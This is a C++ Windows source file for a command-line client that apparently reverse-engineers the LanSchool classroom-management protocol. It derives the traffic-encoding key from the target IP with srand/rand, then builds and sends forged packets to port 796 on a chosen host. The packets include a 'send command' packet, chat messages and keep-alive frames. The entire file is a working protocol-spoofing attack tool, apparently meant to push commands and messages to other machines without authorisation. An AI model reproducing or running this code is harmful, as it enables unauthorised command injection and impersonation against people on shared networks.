#include <iostream>
#include <fstream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <vector>
#include <string>
#include <thread>
#include <limits>
#include <algorithm>
#include <cctype>
#include <csignal>
#include <cstdlib>
#include <conio.h>
#include <ctype.h>
#include <bitset>


#include <Shlobj.h>
#include <Shlobj_core.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "Ws2_32.lib")

//int key = 0x2A5FBD4;
int key = 0;


int shiftLeft(int byte);
int shiftRight(int byte);
int getKeyByte(int key, int index);
void encode(uint8_t* originalArray, int key);

void connectToIP(char* ip_address);



std::string trim(const std::string& str);


std::string getUsername();
void setUsername();

void sendCommand();
void sendMessage();
void beginChat(); bool runChatThread;

std::string username;

PWSTR usernameWpath = NULL;
SOCKET s = INVALID_SOCKET;
WSADATA wsaData;
int iResult;
char* ip;

void signalHandler(int signum) {
    std::cerr << "\n\n\nInterrupt signal: " << signum << " received.\n";
    runChatThread = false;
    closesocket(s);
    exit(signum);
}

int generateKeyFromIP(char* inverted_seed) {
    int seed = 0;
    seed |= ((inverted_seed[3] & 0xFF) << 24);
    seed |= ((inverted_seed[2] & 0xFF) << 16);
    seed |= ((inverted_seed[1] & 0xFF) << 8);
    seed |= ((inverted_seed[0] & 0xFF) << 0);

    std::cout << "[*] Seed = 0x" << std::hex << seed << "\n";
    // C8 00 A8 C0
    
    srand(seed);
    rand();
    rand();
    rand();
    rand();
    rand(); 
    int top_half = rand() << 0x10;
    int bottom_half = rand();
    int newKey = top_half | bottom_half;
    // yes, this is how the program does it, it's not that i write bad code (even though i do)


    key = newKey;
    std::cout << "[*] Key = 0x" << std::hex << key << "\n";
    return seed;
}

int main(int argc, char* argv[]) {
    signal(SIGINT, signalHandler);

    if (argc < 2) {
        std::cerr << "Not enough arguments!\nUsage: " << argv[0] << " <ip address>";
        system("timeout /t 5");
        return 1;
    }
    
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed: " << WSAGetLastError() << std::endl;
        return 1;
    }

   
    HRESULT hr = SHGetKnownFolderPath(FOLDERID_Profile, 0, NULL, &usernameWpath);
    std::wcout << L"[*] Config folder: " << usernameWpath << "\\AppData\\Local\\LanSchool_owo\\\n";



    ip = argv[1];
    connectToIP(ip);
    username = getUsername();
    std::cout << "Welcome back, " << ((username == "") ? "<no username>" : username) << "\n";
    
    

    std::cout << "\
0. set username\n\
1. send command\n\
2. send message\n\
3. begin chat\n";


    std::cout << "select option: ";
    std::string input;
    int choice = -1;
    while (true) {
        input = std::cin.get();
        if (input == "\n") {
            std::cout << "select option: ";
        }
        else {
            try {
                choice = std::stoi(input);
                break;
            }
            catch (const std::invalid_argument& e) {
                
            }
        }
    }
    switch (choice) {
    case 0:
        std::cin.get();
        setUsername();
        break;
    case 1:
        sendCommand();
        break;
    case 2:
        std::cin.get();
        sendMessage();
        break;
    case 3:
        std::cin.get();
        beginChat();
        break;
    default:
        std::cerr << "\nInvalid option selected; quitting!\n";
        return 1;
    }

    CoTaskMemFree(usernameWpath);
    closesocket(s);
    return 0;
}


int shiftLeft(int byte) {
    if ((byte & 0x80) >> 7) {
        byte = byte << 1;
        byte = byte | 1;
    }
    else {
        byte = byte << 1;
    }
    return byte;
}
int shiftRight(int byte) {
    if ((byte & 1)) {
        byte = byte >> 1;
        byte = byte | 0x80;
    }
    else {
        byte = byte >> 1;
    }
    return byte;
}
int getKeyByte(int key, int index) {
    return (key >> index * 8 & 0xFF);
}
void encode(uint8_t* originalArray, int key) {
    uint8_t tempByte;
    tempByte = originalArray[0];
    tempByte = tempByte ^ getKeyByte(key, 1);
    tempByte = shiftLeft(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 0);
    tempByte = shiftRight(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 3);
    tempByte = shiftRight(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 2);
    tempByte = shiftLeft(tempByte);
    originalArray[0] = tempByte;

    tempByte = originalArray[1];
    tempByte = tempByte ^ getKeyByte(key, 2);
    tempByte = shiftRight(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 1);
    tempByte = shiftRight(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 0);
    tempByte = shiftRight(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 3);
    tempByte = shiftLeft(tempByte);
    originalArray[1] = tempByte;

    //third byte skipped
    //fourth byte skipped

    tempByte = originalArray[4];
    tempByte = tempByte ^ getKeyByte(key, 1);
    tempByte = shiftLeft(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 0);
    tempByte = shiftRight(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 3);
    tempByte = shiftRight(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 2);
    tempByte = shiftLeft(tempByte);
    originalArray[4] = tempByte;

    tempByte = originalArray[5];
    tempByte = tempByte ^ getKeyByte(key, 2);
    tempByte = shiftRight(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 1);
    tempByte = shiftRight(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 0);
    tempByte = shiftRight(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 3);
    tempByte = shiftLeft(tempByte);
    originalArray[5] = tempByte;

    tempByte = originalArray[6];
    tempByte = tempByte ^ getKeyByte(key, 2);
    tempByte = shiftLeft(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 1);
    tempByte = shiftRight(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 0);
    tempByte = shiftLeft(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 0);
    tempByte = shiftLeft(tempByte);
    originalArray[6] = tempByte;

    tempByte = originalArray[7];
    tempByte = tempByte ^ getKeyByte(key, 3);
    tempByte = shiftRight(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 2);
    tempByte = shiftLeft(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 1);
    tempByte = shiftLeft(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 0);
    tempByte = shiftRight(tempByte);
    originalArray[7] = tempByte;




    tempByte = originalArray[8];
    tempByte = tempByte ^ getKeyByte(key, 1);
    tempByte = shiftLeft(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 0);
    tempByte = shiftRight(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 3);
    tempByte = shiftRight(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 2);
    tempByte = shiftLeft(tempByte);
    originalArray[8] = tempByte;

    tempByte = originalArray[9];
    tempByte = tempByte ^ getKeyByte(key, 2);
    tempByte = shiftRight(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 1);
    tempByte = shiftRight(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 0);
    tempByte = shiftRight(tempByte);
    tempByte = tempByte ^ getKeyByte(key, 3);
    tempByte = shiftLeft(tempByte);
    originalArray[9] = tempByte;


}


void connectToIP(char* ip_address) {
    s = INVALID_SOCKET;
    struct addrinfo* result = NULL,
                   * ptr = NULL,
                     hints;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    iResult = getaddrinfo(ip_address, "796", &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed: %d\n", iResult);
        WSACleanup();
        exit(1);
    }

    ptr = result;
    s = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
    if (s == INVALID_SOCKET) {
        printf("Error at socket(): %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        exit(1);
    }

    iResult = connect(s, ptr->ai_addr, (int)ptr->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        closesocket(s);
        s = INVALID_SOCKET;
    }

    freeaddrinfo(result);
    if (s == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        exit(1);
    }
    struct sockaddr* sockaddr_ptr = ptr->ai_addr;
    char* sa_data = sockaddr_ptr->sa_data + 2;
    generateKeyFromIP(sa_data);

    // 03 1c c0 a8 00 c8
    // XX XX C8 00 A8 C0
}

std::string trim(const std::string& str){
    // Find the first non-space character
    auto start = std::find_if_not(str.begin(), str.end(), [](unsigned char ch) {
        return std::isspace(ch);
        });

    // Find the last non-space character
    auto end = std::find_if_not(str.rbegin(), str.rend(), [](unsigned char ch) {
        return std::isspace(ch);
        }).base();

    // Return the trimmed string
    return (start < end) ? std::string(start, end) : std::string();
}

std::string getUsername() {
    std::string tempUsername;
    
    std::wstring userFolderPath(usernameWpath);
    std::string userFolderPathStr(userFolderPath.begin(), userFolderPath.end());
    std::string usernameConfigPath = userFolderPathStr + "\\AppData\\Local\\LanSchool_owo\\username.txt";
    std::ifstream inputUsernameConfigFileHandle(usernameConfigPath);
    if (inputUsernameConfigFileHandle.is_open()) {
        std::getline(inputUsernameConfigFileHandle, tempUsername);
        inputUsernameConfigFileHandle.close();
    }
    if (tempUsername == "$empty") {
        return "";
    }
    else if (tempUsername == "") {
        setUsername();
    }
    return trim(tempUsername);
}




void setUsername() {


    std::wstring userFolderPath(usernameWpath);
    std::string userFolderPathStr(userFolderPath.begin(), userFolderPath.end());
    std::string usernameConfigPath = userFolderPathStr + "\\AppData\\Local\\LanSchool_owo\\username.txt";
    std::ifstream inputUsernameConfigFileHandle(usernameConfigPath);
    if (inputUsernameConfigFileHandle.is_open()) {
        std::getline(inputUsernameConfigFileHandle, username);
        inputUsernameConfigFileHandle.close();
    }

    std::string newUsername;
    std::string temp;
    if (username != "") {
        std::cout << "Old username: " << ((username == "$empty") ? "<no username>" : username) << "\n";
    }
    std::cout << "Please set a username: ";
    while (true) {
        temp = std::cin.get();
        if (temp == "\n") {
            newUsername = trim(newUsername);
            if (newUsername == "") {
                newUsername = "";
                int ch;
                std::cout << "Are you sure you want to remove your username? [Y/N] ";
                do
                {
                    ch = _getch();
                    ch = toupper(ch);
                } while (ch != 'Y' && ch != 'N');

                _putch(ch);
                _putch('\r');    // Carriage return
                _putch('\n');    // Line feed
                if (ch == 'Y') {
                    newUsername = "$empty";
                    break;
                }
                else {
                    std::cout << "Please set a username: ";
                }
            }
            else if (newUsername.length() > 64){
                std::cout << "Please keep the username shorter than 64 characters.\nPlease set a username: ";
                newUsername = "";
            }
            else {
                break;
            }
        }
        else {
            newUsername += temp;
        }
    }
    std::ofstream outputUsernameConfigFileHandle(usernameConfigPath);
    if (outputUsernameConfigFileHandle.is_open()) {
        outputUsernameConfigFileHandle << newUsername;
        std::cout << "Your new username is " << ((newUsername == "$empty") ? "<no username>" : newUsername);
        outputUsernameConfigFileHandle.close();
    }
}


void sendCommand() {

    std::string command;
    std::cin.get();
    std::cout << "Enter command (no spaces): ";
    char temp;
    while (true) {
        temp = std::cin.get();
        if (temp == '\n') {
            break;
        }
        else {
            command = command + temp;
        }
    }

    int recvBufLen = 128;

    uint8_t data[512] = { 0x3b, 0x03, 0x01, 0x00, 0xda, 0xd1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    memset(data + 10, 0, sizeof(data) - 10);
    data[14] = username.length(); // username length
    for (int i = 17, j = 0; i < (17 + username.length()); i++, j++) {
        data[i] = username[j];
    }
    data[82] = (uint8_t)command.length();
    data[6] = (command.length() * 2) + 0x57;
    for (int i = 86, j = 0; i < (87 + command.length()); i++, j++) {
        data[i] = command[j];
    }
    for (int i = (86 + command.length()); i < 512; i++) {
        data[i] = 0x00;
    }
    encode(data, key);

    iResult = send(s, reinterpret_cast<const char*>(data), 87 + command.length() * 2, 0);
    if (iResult != (87 + command.length() * 2)) {
        std::cerr << "\nSend failed: " << WSAGetLastError();
        closesocket(s);
        exit(1);
    }
    char recvData[0xFF];
    iResult = recv(s, recvData, 0xFF, 0);
    while (iResult == -1) {
        std::cout << "Failed (" << WSAGetLastError() << ") retrying..\n";
        closesocket(s);
        connectToIP(ip);
        send(s, reinterpret_cast<const char*>(data), 87 + command.length() * 2, 0);
        iResult = recv(s, recvData, 0xFF, 0);
        std::this_thread::sleep_for(std::chrono::milliseconds(250));
    }
    std::cout << "Success, command sent to " << ip << " :3";
    return;
}

void sendMessage() {
    std::string message;
    std::cout << "Enter message: ";
    char temp;
    while (true) {
        temp = std::cin.get();
        if (temp == '\n') {
            if (message.length() <= 115) {
                break;
            }
            else {
                std::cout << "Message too long. Messages can be up to 115 characters long.\nEnter message: ";
                message = "";
            }
        }
        else {
            message += temp;
        }
    }
    if (message.length() == 0) {
        std::cout << "Send empty message? [Y/N] ";
        int ch;
        do
        {
            ch = _getch();
            ch = toupper(ch);
        } while (ch != 'Y' && ch != 'N');

        _putch(ch);
        _putch('\r');
        _putch('\n');
        if (ch == 'Y') {
            message = "";
        }
        else {
            return;
        }
    }

    uint8_t data[512] = { 0x1d, 0x03, 0x01, 0x00, 0xda, 0xd1, 0xFF /*length + 139*/, 0x00, 0x08, 0x7c};
    memset(data + 10, 0, sizeof(data) - 10);
    data[6] = message.length() + 139;
    for (int i = 10, j = 0; i < 74 && j < username.length(); i++, j++) {
        data[i] = username[j];
    }
    for (int i = 138, j = 0; i < (message.length() + 138); i++, j++) {
        data[i] = message[j];
    }
    encode(data, key);
    closesocket(s);
    connectToIP(ip);
    iResult = send(s, reinterpret_cast<const char*>(data), 139 + message.length(), 0);
    if (iResult != (139 + message.length())) {
        std::cerr << "\nSend failed: " << WSAGetLastError();
        closesocket(s);
        exit(1);
    }
    std::cout << "Success, message sent to " << ip << " :3";
    return;
    
}
void keepAliveThread() {
    while (runChatThread){
        uint8_t data[512] = { 0x47, 0x03, 0x01, 0x00, 0xda, 0xd1, 0x8d, 0x00 , 0x08 , 0x7c, 0x08}; //keep-alive-packet-thingy
        encode(data, key);
        memset(data + 11, 0, sizeof(data) - 11);
        iResult = send(s, reinterpret_cast<const char*>(data), 141, 0);
        if (iResult != 141) {
            std::cerr << "\nSend failed: " << WSAGetLastError();
            closesocket(s);
            exit(1);
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}
void beginChat() {
    closesocket(s);
    connectToIP(ip);
    runChatThread = true;
    std::thread chatThreadInstance(keepAliveThread);
    while (true) {
        std::string message;
        std::cout << "Enter message: ";
        char temp;
        while (true) {
            temp = std::cin.get();
            if (temp == '\n') {
                if (message.length() <= 110) {
                    break;
                }
                else {
                    std::cout << "Message too long. Messages can be up to 110 characters long.\nEnter message: ";
                    message = "";
                }
            }
            else {
                message += temp;
            }
        }
        if (message.length() == 0) {
            std::cout << "Cannot send empty message.";
            return;
        }
        if (message == "$exit") {
            uint8_t data[512] = { 0x47, 0x03, 0x01, 0x00, 0xda, 0xd1, 0x141 /*length of message*/, 0x00 , 0x08 , 0x7c, 0x02 };
            memset(data + 11, 0, sizeof(data) - 11);
            encode(data, key);
            iResult = send(s, reinterpret_cast<const char*>(data), 141 + message.length(), 0);
            if (iResult != 141 + message.length()) {
                std::cerr << "\nSend failed: " << WSAGetLastError();
                closesocket(s);
                exit(1);
            }
            else {
                runChatThread = false;
                return;
            }
            
        }
        else {
            uint8_t data[512] = { 0x47, 0x03, 0x01, 0x00, 0xda, 0xd1, 0xFF /*length of message*/, 0x00 , 0x08 , 0x7c, 0x05 };
            memset(data + 11, 0, sizeof(data) - 11);
            for (int i = 12, j = 0; i < (12 + username.length()); i++, j++) {
                data[i] = username[j];
            }
            data[6] = 141 + message.length();
            for (int i = 140, j = 0; i < (140 + message.length()); i++, j++) {
                data[i] = message[j];
            }

            // 0x08 keep-alive
            // 0x05 message
            // 0x02 end
            encode(data, key);
            iResult = send(s, reinterpret_cast<const char*>(data), 141 + message.length(), 0);
            if (iResult != 141 + message.length()) {
                std::cerr << "\nSend failed: " << WSAGetLastError();
                closesocket(s);
                exit(1);
            }
        }
        
    }
    
}